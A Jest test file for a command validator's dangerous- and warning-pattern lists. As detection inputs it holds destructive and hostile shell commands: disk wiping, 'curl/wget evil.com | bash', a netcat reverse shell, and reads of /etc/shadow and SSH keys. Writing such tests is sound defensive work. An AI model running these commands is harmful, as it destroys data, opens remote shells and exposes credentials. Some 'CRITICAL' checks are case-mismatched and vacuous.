/**
 * Validation Constants Tests
 * Tests for dangerous patterns and warning patterns
 */

import { describe, it, expect, beforeAll } from '@jest/globals';

describe('Validation Constants', () => {
  let DANGEROUS_PATTERNS: typeof import('../src/constants/validation.js').DANGEROUS_PATTERNS;
  let WARNING_PATTERNS: typeof import('../src/constants/validation.js').WARNING_PATTERNS;

  beforeAll(async () => {
    const module = await import('../src/constants/validation.js');
    DANGEROUS_PATTERNS = module.DANGEROUS_PATTERNS;
    WARNING_PATTERNS = module.WARNING_PATTERNS;
  });

  describe('DANGEROUS_PATTERNS', () => {
    it('should be an array of patterns', () => {
      expect(Array.isArray(DANGEROUS_PATTERNS)).toBe(true);
      expect(DANGEROUS_PATTERNS.length).toBeGreaterThan(0);
    });

    it('should have valid pattern structure', () => {
      for (const pattern of DANGEROUS_PATTERNS) {
        expect(pattern.pattern).toBeInstanceOf(RegExp);
        expect(typeof pattern.description).toBe('string');
        expect(typeof pattern.riskLevel).toBe('string');
      }
    });

    it('should detect rm -rf / patterns', () => {
      const rmRfPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('rm -rf /'));
      expect(rmRfPattern).toBeDefined();
      expect(rmRfPattern?.riskLevel).toBe('critical');
    });

    it('should detect mkfs commands', () => {
      const mkfsPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('mkfs.ext4 /dev/sda'));
      expect(mkfsPattern).toBeDefined();
      expect(mkfsPattern?.riskLevel).toBe('critical');
    });

    it('should detect dd commands', () => {
      const ddPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('dd if=/dev/zero of=/dev/sda'));
      expect(ddPattern).toBeDefined();
      expect(ddPattern?.riskLevel).toBe('critical');
    });

    it('should detect sudo su', () => {
      const sudoSuPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('sudo su'));
      expect(sudoSuPattern).toBeDefined();
      expect(sudoSuPattern?.riskLevel).toBe('high');
    });

    it('should detect curl | bash', () => {
      const curlBashPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('curl http://evil.com | bash'));
      expect(curlBashPattern).toBeDefined();
      expect(curlBashPattern?.riskLevel).toBe('high');
    });

    it('should detect wget | sh', () => {
      const wgetShPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('wget http://evil.com | sh'));
      expect(wgetShPattern).toBeDefined();
      expect(wgetShPattern?.riskLevel).toBe('high');
    });

    it('should detect reverse shell attempts', () => {
      const ncPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('nc -e /bin/sh evil.com 4444'));
      expect(ncPattern).toBeDefined();
      expect(ncPattern?.riskLevel).toBe('high');
    });

    it('should detect sensitive file access', () => {
      const shadowPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat /etc/shadow'));
      expect(shadowPattern).toBeDefined();
      expect(shadowPattern?.riskLevel).toBe('high');
    });

    it('should detect SSH key access', () => {
      const sshPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat ~/.ssh/id_rsa'));
      expect(sshPattern).toBeDefined();
      expect(sshPattern?.riskLevel).toBe('high');
    });

    it('should detect kill -9 1', () => {
      const killInitPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('kill -9 1'));
      expect(killInitPattern).toBeDefined();
      expect(killInitPattern?.riskLevel).toBe('critical');
    });

    it('should detect base64 obfuscation', () => {
      const base64Pattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('$(echo test | base64)'));
      expect(base64Pattern).toBeDefined();
      expect(base64Pattern?.riskLevel).toBe('medium');
    });

    it('should detect dynamic eval', () => {
      const evalPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('eval $(echo rm)'));
      expect(evalPattern).toBeDefined();
      expect(evalPattern?.riskLevel).toBe('medium');
    });

    it('should not match safe commands', () => {
      const safeCommands = [
        'rm file.txt',
        'ls -la',
        'echo hello',
        'cat file.txt',
        'curl http://example.com',
      ];

      for (const cmd of safeCommands) {
        const matches = DANGEROUS_PATTERNS.filter(p => p.pattern.test(cmd) && p.riskLevel === 'CRITICAL');
        expect(matches.length).toBe(0);
      }
    });
  });

  describe('WARNING_PATTERNS', () => {
    it('should be an array of patterns', () => {
      expect(Array.isArray(WARNING_PATTERNS)).toBe(true);
      expect(WARNING_PATTERNS.length).toBeGreaterThan(0);
    });

    it('should have valid pattern structure', () => {
      for (const pattern of WARNING_PATTERNS) {
        expect(pattern.pattern).toBeInstanceOf(RegExp);
        expect(typeof pattern.description).toBe('string');
      }
    });

    it('should warn about sudo', () => {
      const sudoPattern = WARNING_PATTERNS.find(p => p.pattern.test('sudo apt-get install'));
      expect(sudoPattern).toBeDefined();
      expect(sudoPattern?.description).toContain('sudo');
    });

    it('should warn about rm -rf', () => {
      const rmRfPattern = WARNING_PATTERNS.find(p => p.pattern.test('rm -rf dir'));
      expect(rmRfPattern).toBeDefined();
      expect(rmRfPattern?.description).toContain('deletion');
    });

    it('should warn about chmod 777', () => {
      const chmodPattern = WARNING_PATTERNS.find(p => p.pattern.test('chmod 777 file'));
      expect(chmodPattern).toBeDefined();
      expect(chmodPattern?.description).toContain('world-writable');
    });

    it('should warn about curl pipe', () => {
      const curlPipePattern = WARNING_PATTERNS.find(p => p.pattern.test('curl http://example.com | something'));
      expect(curlPipePattern).toBeDefined();
      expect(curlPipePattern?.description).toContain('curl');
    });

    it('should warn about wget pipe', () => {
      const wgetPipePattern = WARNING_PATTERNS.find(p => p.pattern.test('wget http://example.com | something'));
      expect(wgetPipePattern).toBeDefined();
      expect(wgetPipePattern?.description).toContain('wget');
    });

    it('should warn about exec', () => {
      const execPattern = WARNING_PATTERNS.find(p => p.pattern.test('exec newshell'));
      expect(execPattern).toBeDefined();
      expect(execPattern?.description).toContain('exec');
    });

    it('should warn about disk device access', () => {
      const diskPattern = WARNING_PATTERNS.find(p => p.pattern.test('> /dev/sda'));
      expect(diskPattern).toBeDefined();
      expect(diskPattern?.description).toContain('disk');
    });
  });

  describe('Pattern matching edge cases', () => {
    it('should handle case insensitivity', () => {
      const rmRfPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('RM -RF /'));
      expect(rmRfPattern).toBeDefined();
    });

    it('should not match safe rm commands', () => {
      const patterns = DANGEROUS_PATTERNS.filter(p => p.pattern.test('rm -rf ./node_modules'));
      const criticalMatches = patterns.filter(p => p.riskLevel === 'CRITICAL');
      // Should not match as critical since it's not root
      expect(criticalMatches.length).toBe(0);
    });
  });
});
